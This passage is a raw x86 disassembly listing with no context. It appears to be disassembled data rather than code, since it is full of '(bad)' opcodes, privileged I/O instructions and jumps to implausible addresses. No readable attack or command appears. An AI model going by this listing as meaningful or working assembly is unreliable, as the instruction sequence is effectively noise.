  417583:	out    0x3a,eax
  417585:	sub    eax,0xa324296c
  41758a:	aam    0x2f
  41758c:	data16 ins BYTE PTR es:[edi],dx
  41758e:	pop    ss
  41758f:	cmp    al,0x61
  417591:	daa    
  417592:	jg     0x417573
  417594:	jno    0x417550
  417596:	and    BYTE PTR [edx+eax*2+0x414db07c],dl
  41759d:	pusha  
  41759e:	push   eax
  41759f:	loop   0x4175d5
  4175a1:	sbb    ch,dl
  4175a3:	adc    BYTE PTR [edx],0x2f
  4175a6:	xchg   BYTE PTR [ebp+0x29e6cd71],al
  4175ac:	xchg   ebp,eax
  4175ad:	inc    esp
  4175ae:	repnz pop ss
  4175b0:	xchg   DWORD PTR [ebx],ebx
  4175b2:	rcr    bl,1
  4175b4:	outs   dx,BYTE PTR ds:[esi]
  4175b5:	loopne 0x4175e9
  4175b7:	rol    DWORD PTR [eax],cl
  4175b9:	cmp    al,0x77
  4175bb:	jne    0x41762f
  4175bd:	jo     0x41754a
  4175bf:	mov    cl,0x43
  4175c1:	call   0xc2c78f3b
  4175c6:	mov    al,ds:0x4fe96ff9
  4175cb:	ficom  WORD PTR [ebp-0x71f3e628]
  4175d1:	add    ebx,DWORD PTR [esi-0x2bde9f47]
  4175d7:	inc    esi
  4175d8:	ss jg  0x417583
  4175db:	imul   edi,DWORD PTR [ecx-0x7a],0xffffff8b
  4175df:	pusha  
  4175e0:	sub    al,0x72
  4175e2:	retf   
  4175e3:	rol    DWORD PTR [edx],cl
  4175e5:	test   edi,0xb934b192
  4175eb:	out    dx,al
  4175ec:	clc    
  4175ed:	xor    esi,ebp
  4175ef:	sahf   
  4175f0:	outs   dx,DWORD PTR ds:[esi]
  4175f1:	ins    DWORD PTR es:[edi],dx
  4175f2:	and    ah,BYTE PTR [eax-0x3]
  4175f5:	hlt    
  4175f6:	leave  
  4175f7:	push   0xffffffc5
  4175f9:	mov    al,0x20
  4175fb:	(bad)  
  4175fc:	push   ss
  4175fd:	fisubr WORD PTR [ebx-0x3a]
  417600:	mov    ebx,DWORD PTR [ecx+edi*1+0x406afd09]
  417607:	ror    DWORD PTR [ecx+edi*4+0x2bcb67a3],0x83
  41760f:	mov    DWORD PTR [eax],0xf210021f
  417615:	arpl   WORD PTR [esi-0x52],si
  417618:	adc    DWORD PTR [ebx],0x4
  41761b:	pop    esp
  41761c:	jecxz  0x41760f
  41761e:	adc    eax,0x5681e4f5
  417623:	pop    ebp
  417624:	sub    DWORD PTR [ebp+0xffba781],ebp
  41762a:	inc    ecx
  41762b:	dec    esp
  41762c:	push   ecx
  41762d:	pop    ebx
  41762e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41762f:	sti    
  417630:	mov    ds:0x650e3890,al
  417635:	mov    al,0x13
  417637:	inc    edx
  417638:	inc    ebp
  417639:	sbb    eax,0xd944e686
  41763e:	leave  
  41763f:	mov    edx,esi
  417641:	mov    ebp,0xd0c5c22f
  417646:	in     eax,0x3
  417648:	out    dx,ax
  41764a:	dec    DWORD PTR [ebp+0x6e]
  41764d:	pop    esi
  41764e:	xor    bh,BYTE PTR [ebp+0x358268d6]
  417654:	cs (bad) 
  417656:	and    ebp,DWORD PTR [ebx-0x2]
  417659:	cmp    BYTE PTR [esi],cl
  41765b:	jl     0x41768e
  41765d:	ret    0x6918
  417660:	call   0xaa62:0x54caa971
  417667:	dec    esi
  417668:	sbb    dl,bh
  41766a:	out    0x2c,eax
  41766c:	imul   ecx,edi,0xffffff9e
  41766f:	fdiv   QWORD PTR [edx]
  417671:	jge    0x4176a9
  417673:	fldcw  WORD PTR [esi-0x58c9b965]
  417679:	outs   dx,BYTE PTR ds:[esi]
  41767a:	data16 cld 
  41767c:	(bad)  
  41767d:	push   esi
  41767e:	mov    dl,0xe8
  417680:	das    
  417681:	shl    DWORD PTR [edi+0x549cb267],0xea
  417688:	pop    ebp
  417689:	mov    edi,0x728abfc4
  41768e:	vmulss xmm2,xmm4,DWORD PTR [ebx-0x6b5e1e0d]
  417696:	mov    al,ds:0xc25d2f80
  41769b:	pop    ss
  41769c:	dec    ebx
  41769d:	pop    esi
  41769e:	aad    0x28
  4176a0:	out    dx,al
  4176a1:	lods   al,BYTE PTR ds:[esi]
  4176a2:	push   ebx
  4176a3:	lods   eax,DWORD PTR ds:[esi]
  4176a4:	inc    esi
  4176a5:	push   ds
  4176a6:	dec    esp
  4176a7:	fwait
  4176a8:	icebp  
  4176a9:	jg     0x4176e5
  4176ab:	push   0x17bc5687
  4176b0:	push   ebp
  4176b1:	jecxz  0x4176d5
  4176b3:	sub    eax,0x7ee42b15
  4176b8:	xlat   BYTE PTR ds:[ebx]
  4176b9:	mov    bl,0x34
  4176bb:	popa   
  4176bc:	push   cs
  4176bd:	int3   
  4176be:	fwait
  4176bf:	adc    DWORD PTR [ecx],edx
  4176c1:	femms  
  4176c3:	mov    ebx,0x73a87166
  4176c8:	(bad)  
  4176c9:	in     al,0x42
  4176cb:	xor    BYTE PTR [edi-0x6f1878e5],dh
  4176d1:	inc    eax
  4176d2:	stos   BYTE PTR es:[edi],al
  4176d3:	pusha  
  4176d4:	xor    esi,DWORD PTR [ebx+ecx*8-0x7ee39cbc]
  4176db:	and    eax,DWORD PTR [edi+0x3c8ab0cf]
  4176e1:	(bad)  
  4176e2:	or     DWORD PTR [ecx+0x40],eax
  4176e5:	bound  ecx,QWORD PTR [ebx+0x30bf559b]
  4176eb:	aam    0x18
  4176ed:	fld    DWORD PTR [eax-0x3822ced6]
  4176f3:	arpl   WORD PTR [eax-0x79],si
  4176f6:	(bad)  
  4176f7:	dec    esp
  4176f8:	out    0xc2,al
  4176fa:	and    DWORD PTR [ebx+ecx*1-0x1362c33d],ebp
  417701:	cld    
  417702:	out    0xa8,al
  417704:	(bad)  
  417705:	sub    al,0x73
  417707:	mov    dl,0x5b
  417709:	mov    bh,0xb2
  41770b:	ret    0xa4e2
  41770e:	mov    ?,WORD PTR [edi]
  417710:	setne  BYTE PTR [ebx-0x6e]
  417714:	cdq    
  417715:	mov    al,ds:0xae9642f0
  41771a:	xchg   edi,eax
  41771b:	xor    bh,BYTE PTR [eax-0x1a]
  41771e:	dec    esi
  41771f:	inc    al
  417721:	add    al,0x2b
  417723:	out    dx,eax
  417724:	push   ecx
  417725:	retf   0xe863
  417728:	in     al,0xf3
  41772a:	scas   al,BYTE PTR es:[edi]
  41772b:	stos   BYTE PTR es:[edi],al
  41772c:	dec    esp
  41772d:	pop    edx
  41772e:	fidivr WORD PTR [eax+0x896fee5]
  417734:	int    0x22
  417736:	xchg   esi,eax
  417737:	and    al,0xdb
  417739:	sbb    DWORD PTR [esi+0x7e],esp
  41773c:	(bad)  
  41773d:	jg     0x417744
  41773f:	ret    
  417740:	mov    al,ds:0xa91db98d
  417745:	outs   dx,BYTE PTR ds:[esi]
  417746:	fiadd  DWORD PTR [edi]
  417748:	test   DWORD PTR [ebp+eax*1+0x6f9150e2],edx
  41774f:	jmp    0x9eb50b9f
  417754:	push   edi
  417755:	setp   BYTE PTR [eax]
  417758:	test   al,0x2f
  41775a:	in     eax,dx
  41775b:	jnp    0x4177c1
  41775d:	cmp    cl,ah
  41775f:	enter  0x74c,0x94
  417763:	ret    
  417764:	in     al,dx
  417765:	push   ebp
  417766:	hlt    
  417767:	out    dx,eax
  417768:	mov    bl,0x23
  41776a:	cld    
  41776b:	or     al,0xd4
  41776d:	mov    bl,0xcb
  41776f:	xor    DWORD PTR [ebp+0x3a],ebx
  417772:	cmp    edi,edx
  417774:	xchg   DWORD PTR fs:[ebp-0x90ad2fb],ebp
  41777b:	or     ebx,DWORD PTR [ebx-0x15e79356]
  417781:	mov    dh,0x3c
  417783:	push   ecx
  417784:	sbb    al,0x50
  417786:	push   ecx
  417787:	or     al,0xbc
  417789:	nop
  41778a:	aaa    
  41778b:	ret    
  41778c:	push   ebp
  41778d:	int    0x39
  41778f:	ss loopne 0x4177eb
  417792:	dec    eax
  417793:	test   bh,0x58
  417796:	add    cl,BYTE PTR [ecx-0x43e9bc0f]
  41779c:	push   ds
  41779d:	les    ecx,FWORD PTR [edi+eax*4-0x9]
  4177a1:	mov    ds:0x19a74595,eax
  4177a6:	jp     0x41772a
  4177a8:	in     al,dx
  4177a9:	xchg   edx,eax
  4177aa:	mov    al,0x24
  4177ac:	or     BYTE PTR [esi-0x7c5c46ce],bh
  4177b2:	push   ecx
  4177b3:	sub    DWORD PTR [edi],edi
  4177b5:	pop    edi
  4177b6:	sbb    DWORD PTR [esi+0x4d],0xfffffff5
  4177ba:	fcom   st(0)
  4177bc:	aam    0x7d
  4177be:	xchg   edx,eax
  4177bf:	adc    BYTE PTR [ecx+edx*1+0x29],al
  4177c3:	or     BYTE PTR [edi],al
  4177c5:	fistp  WORD PTR [esp+edx*8-0x455fdbb]
  4177cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177cd:	jbe    0x417815
  4177cf:	push   edx
  4177d0:	fwait
  4177d1:	in     eax,dx
  4177d2:	pop    ecx
  4177d3:	fsubrp st(7),st
  4177d5:	ret    0x7753
  4177d8:	call   0x69c5:0x69810e09
  4177df:	pop    ecx
  4177e0:	inc    ecx
  4177e1:	jle    0x4177a9
  4177e3:	and    cl,dh
  4177e5:	push   es
  4177e6:	dec    edi
  4177e7:	loopne 0x4177e5
  4177e9:	mov    ds:0xba43aaed,eax
  4177ee:	fidiv  WORD PTR [edi+0x5f]
  4177f1:	mov    ecx,0xbe14dba1
  4177f6:	test   BYTE PTR [eax],ah
  4177f8:	jne    0x4177fb
  4177fa:	adc    DWORD PTR [edx],edx
  4177fc:	sub    al,0xb3
  4177fe:	fiadd  DWORD PTR [edx+0x11dd0f96]
  417804:	jle    0x4177d3
  417806:	inc    edi
  417807:	sbb    bl,BYTE PTR [ebp+0x4e]
  41780a:	sub    BYTE PTR [esi+0x4e4f5757],ch
  417810:	pop    edx
  417811:	add    eax,0x81f141b5
  417816:	cmp    al,0xb9
  417818:	pop    ss
  417819:	mov    dh,BYTE PTR [ebx+0x7e60efe5]
  41781f:	ss clc 
  417821:	ss ror ecx,cl
  417824:	push   0x6fa59cda
  417829:	xchg   esi,eax
  41782a:	fbstp  TBYTE PTR [eax-0x3f6c32ba]
  417830:	sub    al,0xc2
  417832:	mov    dh,0x7d
  417834:	aas    
  417835:	pop    ebx
  417836:	popa   
  417837:	mov    cl,0xa8
  417839:	sbb    eax,edx
  41783b:	xor    DWORD PTR [esi],eax
  41783d:	mov    edi,eax
  41783f:	(bad)  
  417840:	push   0x74c45ad9
  417845:	std    
  417846:	mov    ?,WORD PTR ds:0x49b62b72
  41784c:	push   ds
  41784d:	shl    DWORD PTR [esi-0x3314b7a0],cl
  417853:	adc    DWORD PTR [esi],esi
  417855:	jmp    0x70e1:0xd60d2036
  41785c:	dec    ecx
  41785d:	xor    bh,BYTE PTR [eax]
  41785f:	test   DWORD PTR [ebx],esp
  417861:	ret    0xdf12
  417864:	(bad)  
  417865:	bswap  edi
  417867:	pop    es
  417868:	mov    dh,0x8b
  41786a:	fstp   DWORD PTR [edi]
  41786c:	repz fimul WORD PTR [eax+0x5f]
  417870:	adc    ah,BYTE PTR [ebx+0x59]
  417873:	add    edi,DWORD PTR [edi]
  417875:	and    DWORD PTR ds:0xf4dec9ed,esi
  41787b:	mov    bh,0x65
  41787d:	xchg   ebp,eax
  41787e:	and    ecx,edx
  417880:	lds    ebx,FWORD PTR [ebp-0x6c]
  417883:	sahf   
  417884:	hlt    
  417885:	mov    edi,0xa7f14182
  41788a:	sub    ebx,DWORD PTR [ebx+eax*2+0x5a]
  41788e:	(bad)
  417892:	fistp  DWORD PTR [ecx+ecx*2+0x5e1d6bfa]
  417899:	das    
  41789a:	rcr    eax,1
  41789c:	loopne 0x4178bd
  41789e:	outs   dx,BYTE PTR ds:[esi]
  41789f:	inc    ebp
  4178a0:	fstp   DWORD PTR [edi+0x275e026e]
  4178a6:	push   esi
  4178a7:	out    dx,eax
  4178a8:	in     eax,0x65
  4178aa:	push   edx
  4178ab:	cmp    DWORD PTR [ebx],edi
  4178ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178ae:	in     eax,dx
  4178af:	in     eax,0xb8
  4178b1:	adc    eax,edi
  4178b3:	xor    bl,bl
  4178b5:	xchg   ecx,eax
  4178b6:	cs pop eax
  4178b8:	and    eax,0x3cb420cf
  4178bd:	shr    DWORD PTR [ebx-0x139087d6],cl
  4178c3:	aam    0x35
  4178c5:	xor    esi,esi
  4178c7:	xchg   ecx,eax
  4178c8:	adc    DWORD PTR [ecx+0x737c5e0a],edi
  4178ce:	js     0x417894
  4178d0:	test   ebx,esi
  4178d2:	ins    DWORD PTR es:[edi],dx
  4178d3:	add    BYTE PTR [ecx+eax*8-0x45],ch
  4178d7:	cmp    ecx,0xffffffcc
  4178da:	mov    edx,0x1d61a322
  4178df:	loopne 0x417871
  4178e1:	je     0x417882
  4178e3:	and    BYTE PTR [ecx],ah
  4178e5:	mov    ebx,0x49e63f9b
  4178ea:	lahf   
  4178eb:	(bad)  
  4178ec:	fild   DWORD PTR [eax]
  4178ee:	xor    bh,BYTE PTR [ebx+0x1f08091c]
  4178f4:	jnp    0x4178af
  4178f6:	xchg   ebp,eax
  4178f7:	inc    ebx
  4178f8:	and    BYTE PTR [edx],0xfb
  4178fb:	mov    dl,bl
  4178fd:	cmc    
  4178fe:	sbb    al,0xa7
  417900:	popf   
  417901:	fcom   QWORD PTR [ebp+0x4b]
  417904:	sbb    BYTE PTR [edi+0x27],0x63
  417908:	dec    edi
  417909:	jbe    0x417936
  41790b:	dec    esi
  41790c:	sqrtps xmm5,xmm0
  41790f:	push   ds
  417910:	xor    BYTE PTR [edx],bh
  417912:	adc    eax,0x767afcec
  417917:	(bad)  
  417918:	xchg   edx,eax
  417919:	cli    
  41791a:	add    ebp,esi
  41791c:	push   esi
  41791d:	mov    ds:0x502974ab,al
  417922:	fisttp DWORD PTR [edx]
  417924:	loop   0x4178c2
  417926:	bswap  esi
  417928:	ror    BYTE PTR [edi],1
  41792a:	loopne 0x4178f7
  41792c:	pop    ss
  41792d:	inc    ecx
  41792e:	(bad)  
  41792f:	mov    edi,0x558d0c19
  417934:	adc    DWORD PTR [esi+0x39],0x2
  417938:	pop    esp
  417939:	pusha  
  41793a:	fadd   DWORD PTR [ebx]
  41793c:	outs   dx,DWORD PTR ds:[esi]
  41793d:	dec    ebp
  41793e:	jo     0x417996
  417940:	lds    esi,FWORD PTR [ebp-0x54aef39c]
  417946:	add    DWORD PTR [ebx-0x5b2ec7c],ebp
  41794c:	jg     0x417911
  41794e:	lods   al,BYTE PTR ds:[esi]
  41794f:	clc    
  417950:	loopne 0x417946
  417952:	push   ds
  417953:	jl     0x417972
  417955:	lock sbb BYTE PTR [edx],ch
  417958:	sub    ecx,ecx
  41795a:	add    ecx,DWORD PTR [edi+0x1db67ce6]
  417960:	push   esi
  417961:	cmp    DWORD PTR [ebp+0x3a],ecx
  417964:	pop    ebp
  417965:	mov    ch,0x8d
  417967:	loope  0x4179da
  417969:	je     0x41797b
  41796b:	dec    ecx
  41796c:	rcr    BYTE PTR [edi+0x3d],1
  41796f:	and    DWORD PTR [esi-0x5040ad5f],edi
  417975:	cdq    
  417976:	mov    ds:0x5023b3d4,eax
  41797b:	sahf   
  41797c:	lea    ebx,[edi+0x2b299329]
  417982:	mov    bh,0x9b
  417984:	adc    BYTE PTR [esp+edi*4-0x52],ch
  417988:	fwait
  417989:	mov    dl,dh
  41798b:	push   edi
  41798c:	or     ebp,esi
  41798e:	stos   DWORD PTR es:[edi],eax
  41798f:	hlt    
  417990:	adc    eax,0xdc9e290a
  417995:	add    bh,0x1b
  417998:	mov    dh,0xf9
  41799a:	loopne 0x417942
  41799c:	dec    ecx
  41799d:	dec    esp
  41799e:	sub    eax,ebp
  4179a0:	mov    ecx,0xdb634211
  4179a5:	adc    ch,BYTE PTR [ecx]
  4179a7:	push   ebp
  4179a8:	dec    esi
  4179a9:	retf   
  4179aa:	or     al,0xed
  4179ac:	icebp  
  4179ad:	loope  0x4179d8
  4179af:	stos   DWORD PTR es:[edi],eax
  4179b0:	sti    
  4179b1:	pop    es
  4179b2:	mov    eax,0x7766e737
  4179b7:	or     ah,BYTE PTR [ebx]
  4179b9:	(bad)  
  4179ba:	mov    eax,0x356d9961
  4179bf:	pop    esi
  4179c0:	fidiv  WORD PTR [ebx-0x69]
  4179c3:	mov    al,0x92
  4179c5:	clc    
  4179c6:	add    bl,BYTE PTR [eax]
  4179c8:	jbe    0x417969
  4179ca:	dec    ecx
  4179cb:	cmc    
  4179cc:	inc    eax
  4179cd:	pop    es
  4179ce:	push   0xffffffa7
  4179d0:	dec    esp
  4179d1:	sbb    DWORD PTR [eax-0x33bc2f32],esp
  4179d7:	sahf   
  4179d8:	test   DWORD PTR [ecx+eax*1],edi
  4179db:	sub    al,0xa2
  4179dd:	pop    ds
  4179de:	jne    0x4179d2
  4179e0:	and    DWORD PTR [ebx],eax
  4179e2:	shl    ebx,cl
  4179e4:	inc    ebx
  4179e5:	dec    eax
  4179e6:	pop    eax
  4179e7:	cmp    al,0xc6
  4179e9:	aad    0x8e
  4179eb:	mov    esi,0x10179894
  4179f0:	push   ecx
  4179f1:	jmp    0x3cee0e04
  4179f6:	sbb    BYTE PTR [edi-0x62],bh
  4179f9:	stc    
  4179fa:	lock mov ebx,0xcceed902
  417a00:	jmp    0x417a55
  417a02:	inc    ecx
  417a03:	jo     0x4179c1
  417a05:	sbb    dl,bh
  417a07:	inc    ebx
  417a08:	and    BYTE PTR [eax+0x2e],0xbd
  417a0c:	inc    ebp
  417a0d:	jns    0x417a36
  417a0f:	fsubp  st(7),st
  417a11:	pop    edi
  417a12:	dec    esp
  417a13:	cmp    edi,DWORD PTR gs:[ebx+0x436039b0]
  417a1a:	xor    BYTE PTR ds:0xda02dc9,bh
  417a20:	outs   dx,DWORD PTR ds:[esi]
  417a21:	std    
  417a22:	add    eax,0x8f496da
  417a27:	push   cs
  417a28:	cmp    al,BYTE PTR [ebx+0x4960c931]
  417a2e:	call   0x2a5d5c7b
  417a33:	in     eax,0xb7
  417a35:	daa    
  417a36:	push   0x2e
  417a38:	dec    eax
  417a39:	(bad)  
  417a3b:	mov    edx,0x86109b6
  417a40:	add    al,BYTE PTR [ebp-0x1c]
  417a43:	sahf   
  417a44:	pop    ecx
  417a45:	and    BYTE PTR [ecx+0x49],bh
  417a48:	ins    BYTE PTR es:[edi],dx
  417a49:	adc    DWORD PTR ds:0xdd7dbeee,eax
  417a4f:	bound  edi,QWORD PTR [ebx+esi*8+0x5]
  417a53:	xor    bl,cl
  417a55:	lds    ebx,FWORD PTR [ecx]
  417a57:	cld    
  417a58:	mov    ecx,0x2b4c44f9
  417a5d:	les    ebx,FWORD PTR [eax]
  417a5f:	aas    
  417a60:	int    0xc1
  417a62:	cmp    DWORD PTR [ebx+0x2821de80],0x4be005f7
  417a6c:	leave  
  417a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a6e:	pop    edx
  417a6f:	dec    ecx
  417a70:	daa    
  417a71:	pop    edi
  417a72:	or     DWORD PTR [esi+0x3b91ed65],ebx
  417a78:	and    al,0xae
  417a7a:	xor    al,0x62
  417a7c:	mov    ebx,0x9dc87e3d
  417a81:	or     BYTE PTR [ecx],bl
  417a83:	xchg   BYTE PTR [ebp+0x53],dl
  417a86:	popf   
  417a87:	ss sbb eax,0xc90f0d60
  417a8d:	sbb    DWORD PTR [esi-0x2d],edx
  417a90:	mov    ecx,0x7b24e084
  417a95:	xlat   BYTE PTR ds:[ebx]
  417a96:	test   al,0xc1
  417a98:	out    0x9a,al
  417a9a:	push   es
  417a9b:	fisub  DWORD PTR [ecx]
  417a9d:	cmp    al,0xac
  417a9f:	xor    ah,BYTE PTR [edi-0x22]
  417aa2:	mov    eax,ds:0xe12f1322
  417aa7:	push   0x94a66250
  417aac:	mov    dh,0x9a
  417aae:	sub    edx,esi
  417ab0:	pop    edi
  417ab1:	jb     0x417b18
  417ab3:	dec    esp
  417ab4:	xlat   BYTE PTR ds:[ebx]
  417ab5:	push   eax
  417ab6:	cmp    al,ah
  417ab8:	dec    edi
  417ab9:	mov    WORD PTR [eax-0x49],cs
  417abc:	call   0x5d804b3
  417ac1:	dec    edi
  417ac2:	cmp    al,0x5d
  417ac4:	mov    edx,0xb40868
  417ac9:	(bad)  
  417aca:	push   esp
  417acb:	add    ecx,esp
  417acd:	dec    edx
  417ace:	jg     0x417b28
  417ad0:	icebp  
  417ad1:	inc    ebp
  417ad2:	add    al,0x98
  417ad4:	pop    ds
  417ad5:	sub    ax,0xa44
  417ad9:	cmp    BYTE PTR [ecx-0x674c4e43],bh
  417adf:	adc    edi,DWORD PTR [edi]
  417ae1:	aaa    
  417ae2:	and    eax,0xfc6511a1
  417ae7:	inc    esp
  417ae8:	mov    es,WORD PTR [ebx+0x4a]
  417aeb:	jae    0x417ab3
  417aed:	add    BYTE PTR [edi-0x50],al
  417af0:	bound  ecx,QWORD PTR [ebx-0x1a]
  417af3:	or     DWORD PTR [ebx-0x34],esi
  417af6:	loopne 0x417afe
  417af8:	fdivr  DWORD PTR [esi-0x6d40a44]
  417afe:	ret    0xa1eb
  417b01:	fstp   DWORD PTR [ebx+0x2d7f608b]
  417b07:	or     ah,BYTE PTR ds:0x6f146e4d
  417b0d:	mov    es,WORD PTR [esi]
  417b0f:	dec    edx
  417b10:	bound  edx,QWORD PTR [edx]
  417b12:	adc    edi,ecx
  417b14:	enter  0x9a70,0xce
  417b18:	push   esi
  417b19:	jo     0x417aa4
  417b1b:	and    eax,0xdefec891
  417b20:	or     ax,0x1eca
  417b24:	and    eax,0x54af83a2
  417b29:	jp     0x417b33
  417b2b:	cli    
  417b2c:	rcl    BYTE PTR [edx-0x5f],0x9a
  417b30:	sbb    al,0xa7
  417b32:	clc    
  417b33:	retf   
  417b34:	or     bh,cl
  417b36:	ja     0x417af5
  417b38:	jo     0x417b9e
  417b3a:	in     al,dx
  417b3b:	lahf   
  417b3c:	in     al,dx
  417b3d:	cdq    
  417b3e:	jmp    0xb0a7:0x2436ed6
  417b45:	mov    DWORD PTR [edx+eax*8+0x4c],esp
  417b49:	lahf   
  417b4a:	mov    esi,0x1c0428df
  417b4f:	sub    DWORD PTR [edi-0x19823d2b],esp
  417b55:	dec    edi
  417b56:	xchg   edx,eax
  417b57:	lods   al,BYTE PTR ds:[esi]
  417b58:	and    dl,bl
  417b5a:	out    dx,eax
  417b5b:	stos   DWORD PTR es:[edi],eax
  417b5c:	push   0x40c9f364
  417b61:	push   ss
  417b62:	in     eax,0xeb
  417b64:	ja     0x417b14
  417b66:	out    dx,eax
  417b67:	dec    ecx
  417b68:	mov    ah,0x74
  417b6a:	fwait
  417b6b:	arpl   WORD PTR [ecx],bp
  417b6d:	jno    0x417b56
  417b6f:	lods   al,BYTE PTR ds:[esi]
  417b70:	out    0xfe,al
  417b72:	pop    es
  417b73:	int    0x88
  417b75:	(bad)
  417b78:	dec    eax
  417b79:	in     eax,0x6a
  417b7b:	rcr    BYTE PTR [edx],1
  417b7d:	ret    0x1cda
  417b80:	outs   dx,DWORD PTR ds:[esi]
  417b81:	lea    ebx,[esi-0xa]
  417b84:	mov    al,0x48
  417b86:	mov    dl,0xb9
  417b88:	inc    edi
  417b89:	sub    DWORD PTR [ecx-0x2784d3a9],esp
  417b8f:	push   ss
  417b90:	clc    
  417b91:	jl     0x417be0
  417b93:	dec    edi
  417b94:	xchg   ebx,eax
  417b95:	xor    eax,ebx
  417b97:	push   edx
  417b98:	sub    eax,0xf9ba35cf
  417b9d:	push   ecx
  417b9e:	adc    al,0xff
  417ba0:	add    ch,ch
  417ba2:	and    bl,0x4f
  417ba5:	push   ss
  417ba6:	jmp    0x903ba9a4
  417bab:	ins    DWORD PTR es:[edi],dx
  417bac:	push   cs
  417bad:	push   edx
  417bae:	cmp    bh,al
  417bb0:	jecxz  0x417bf0
  417bb2:	stos   BYTE PTR es:[edi],al
  417bb3:	pop    edx
  417bb4:	popa   
  417bb5:	cs sub al,0x3e
  417bb8:	jmp    0xaed41dce
  417bbd:	(bad)  
  417bbe:	into   
  417bbf:	lods   ax,WORD PTR ds:[esi]
  417bc1:	xchg   ebx,eax
  417bc2:	mov    ds:0x6cd32586,eax
  417bc7:	mul    DWORD PTR [ebx+0x38]
  417bca:	leave  
  417bcb:	int3   
  417bcc:	cmp    edi,DWORD PTR fs:[ecx-0xd]
  417bd0:	jmp    0xaa33:0x370f1acd
  417bd7:	mov    edx,DWORD PTR [ebx]
  417bd9:	mov    esp,0xe13e416c
  417bde:	sbb    edx,DWORD PTR [ecx]
  417be0:	pop    ebx
  417be1:	pop    ecx
  417be2:	mov    ebx,0xa820e9fd
  417be7:	sbb    DWORD PTR [eax+ebp*8],edx
  417bea:	jge    0x417bae
  417bec:	xlat   BYTE PTR ds:[ebx]
  417bed:	mov    ebx,0xdb696b50
  417bf2:	jge    0x417bbc
  417bf4:	push   ss
  417bf5:	lods   al,BYTE PTR ss:[esi]
  417bf7:	xor    ch,BYTE PTR [esi+0x5d]
  417bfa:	xchg   ecx,eax
  417bfb:	adc    DWORD PTR [esi-0x44],ebx
  417bfe:	xchg   BYTE PTR [esi],cl
  417c00:	fnstcw WORD PTR [ebp+0x727d3f72]
  417c06:	popa   
  417c07:	jno    0x417be8
  417c09:	pop    ss
  417c0a:	cwde   
  417c0b:	les    esi,FWORD PTR [ecx+eax*2-0x4880801]
  417c12:	cmp    DWORD PTR [esi-0x11564c2e],0xc0fb6ef
  417c1c:	mov    bl,0x76
  417c1e:	lods   eax,DWORD PTR ds:[esi]
  417c1f:	inc    DWORD PTR ds:[edx-0x2d82d93b]
  417c26:	push   edx
  417c27:	out    dx,eax
  417c28:	pop    es
  417c29:	push   eax
  417c2a:	cwde   
  417c2b:	and    DWORD PTR [eax+0x6b4b47a0],ecx
  417c31:	mov    bh,0x4d
  417c33:	jbe    0x417c11
  417c35:	fisubr DWORD PTR [edi+0x45]
  417c38:	dec    esi
  417c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c3a:	ins    DWORD PTR es:[edi],dx
  417c3b:	icebp  
  417c3c:	sub    BYTE PTR [edi+eax*2],ch
  417c3f:	fcom   QWORD PTR [ebx+0xd1ff33a]
  417c45:	out    dx,al
  417c46:	xchg   edi,eax
  417c47:	jl     0x417bd9
  417c49:	mov    bl,0x5
  417c4b:	xchg   ebx,eax
  417c4c:	xor    al,0x86
  417c4e:	in     al,dx
  417c4f:	(bad)  
  417c50:	xchg   esp,eax
  417c51:	sub    edx,DWORD PTR [edx-0x17813e87]
  417c57:	jbe    0x417be6
  417c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c5a:	lods   al,BYTE PTR ds:[esi]
  417c5b:	lods   eax,DWORD PTR ds:[esi]
  417c5c:	dec    ecx
  417c5d:	lods   al,BYTE PTR ds:[esi]
  417c5f:	jle    0x417bf3
  417c61:	cli    
  417c62:	mov    bh,0x8
  417c64:	lock aam 0x14
  417c67:	std    
  417c68:	pop    ebx
  417c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c6a:	mov    ds:0x27f107b3,eax
  417c6f:	cld    
  417c70:	mov    dh,0x11
  417c72:	fstp   DWORD PTR [ebx]
  417c74:	stos   DWORD PTR es:[edi],eax
  417c75:	ret    
  417c76:	popf   
  417c77:	pop    eax
  417c78:	sbb    ebx,DWORD PTR [ebx-0x2c]
  417c7b:	imul   ebp,DWORD PTR [eax+edx*1-0x3bed7bb5],0x3a
  417c83:	inc    ebx
  417c84:	add    DWORD PTR [ecx+0x47],esi
  417c87:	mov    eax,0x44f8495e
  417c8c:	popf   
  417c8d:	sub    al,0x18
  417c8f:	mov    ah,0xf9
  417c91:	xlat   BYTE PTR ds:[ebx]
  417c92:	mov    bh,0x90
  417c94:	add    al,0x18
  417c96:	rol    ecx,1
  417c98:	das    
  417c99:	mov    eax,cs
  417c9b:	sub    edi,DWORD PTR [ecx+esi*2]
  417c9e:	aad    0x20
  417ca0:	mov    edi,0xe6de4f3a
  417ca5:	sub    dh,BYTE PTR [edx-0x7a07f984]
  417cab:	sbb    cl,bl
  417cad:	push   ds
  417cae:	icebp  
  417caf:	imul   edx,DWORD PTR [edx],0x8c95127b
  417cb5:	pop    ebp
  417cb6:	sbb    cl,BYTE PTR [eax-0x69]
  417cb9:	aam    0x72
  417cbb:	cmp    BYTE PTR [ebx-0x46],0xe8
  417cbf:	dec    esi
  417cc0:	inc    esi
  417cc1:	mov    BYTE PTR [edx],bl
  417cc3:	test   eax,0x387c07f8
  417cc8:	dec    eax
  417cc9:	cmp    al,0xf0
  417ccb:	imul   ebp,DWORD PTR [esi+eax*1-0x14628c3b],0xffffffa9
  417cd3:	pop    esi
  417cd4:	and    DWORD PTR [esi-0x48f5b9cf],ebx
  417cda:	call   0xd3e35979
  417cdf:	iretw  
  417ce1:	js     0x417ce5
  417ce3:	mov    ds:0xe95410cb,eax
  417ce8:	ficomp DWORD PTR [ecx]
  417cea:	cmp    eax,DWORD PTR [eiz*4-0x3c8d51e4]
  417cf1:	xchg   ebx,eax
  417cf2:	jmp    0xacc5:0xa0d702db
  417cf9:	rcl    DWORD PTR [ebx+0x62],0x57
  417cfd:	dec    eax
  417cfe:	ret    0xc7c3
  417d01:	stos   DWORD PTR es:[edi],eax
  417d02:	add    bh,BYTE PTR [edx]
  417d04:	adc    al,0xba
  417d06:	and    al,0xd5
  417d08:	cmc    
  417d09:	and    DWORD PTR [ebx+0x5ada6e84],edi
  417d0f:	add    BYTE PTR [ebp+0x5b],dh
  417d12:	xchg   esi,eax
  417d13:	mov    edi,0x68659837
